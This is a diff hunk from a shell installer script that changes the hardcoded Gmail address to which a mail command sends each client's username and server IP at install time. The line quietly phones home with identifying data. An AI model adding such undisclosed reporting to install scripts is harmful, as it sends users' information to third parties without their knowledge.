@@ -53,7 +53,7 @@ Client Installation Data
 ━━━━━━━━━━━━━━━━━━━━━
 Username : $Name
 IP       : $MYIP
-━━━━━━━━━━━━━━━━━━━━━" | mail -s "Client Installation Data" kdevn9@gmail.com 
+━━━━━━━━━━━━━━━━━━━━━" | mail -s "Client Installation Data" manpokr7@gmail.com 
 
 #Warna
 apt install lolcat -y
